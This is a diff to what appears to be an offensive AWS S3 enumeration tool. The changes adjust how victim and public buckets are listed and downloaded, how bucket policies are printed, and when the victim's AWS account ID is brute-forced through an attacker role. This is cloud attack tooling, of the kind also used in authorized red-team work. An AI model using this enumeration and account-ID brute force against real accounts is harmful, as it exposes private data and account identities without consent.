@@ -21,12 +21,12 @@ def s3_init_enum(victim_s3_client, attacker_session):
         download_private_bucket(victim_s3_client, buckets)
         get_bucket_policy(victim_s3_client, buckets)
     else:
-        public_buckets = list_public_buckets(my_globals.unsigned_s3_client, buckets)
+        buckets += list_public_buckets(my_globals.unsigned_s3_client, buckets)
         download_public_bucket(my_globals.unsigned_s3_client, buckets)
     # If victim AWS account ID was not provided, then brute-force it from a public bucket
-    if not my_globals.victim_aws_account_ID:
-        if public_buckets and my_globals.attacker_S3_role_arn and attacker_session :
-            brute_force_aws_account_id(public_buckets, my_globals.attacker_S3_role_arn, attacker_session)
+    if my_globals.victim_aws_account_ID is None:
+        if buckets and my_globals.attacker_S3_role_arn and attacker_session :
+            brute_force_aws_account_id(buckets, my_globals.attacker_S3_role_arn, attacker_session)
     else:
         print(f"{Fore.LIGHTBLACK_EX} | AWS account ID was found before, or already set. Skipping S3 AWS account ID brute-force.")
 
@@ -82,7 +82,7 @@ def get_bucket_policy(s3_client, buckets):
                 print(f"{Fore.CYAN} | Getting policy for bucket: {bucket}")
                 response = s3_client.get_bucket_policy(Bucket=bucket)
                 policy = json.loads(response['Policy'])
-                print(f"{Fore.YELLOW}   {json.dumps(policy, indent=4, sort_keys=True, default=custom_serializer)}")
+                print(f"{Fore.YELLOW}{json.dumps(policy, indent=4, sort_keys=True, default=custom_serializer)}")
             except KeyboardInterrupt:
                 raise
             except Exception as e:
@@ -168,7 +168,7 @@ def brute_force_aws_account_id(public_buckets, s3_role_arn, attacker_session):
     bucket, key = to_s3_args(public_bucket)
 
     if not can_access_with_policy(attacker_session, bucket, key, s3_role_arn, {}):
-        print(f"{Fore.LIGHTBLACK_EX}Role {s3_role_arn} cannot access {bucket}", file=sys.stderr)
+        print(f"{Fore.LIGHTBLACK_EX}Role {s3_role_arn} cannot access {bucket}. Bucket is not public", file=sys.stderr)
         return
 
     print(f"{Fore.CYAN}Starting brute-force of AWS Account ID (this can take a while):")
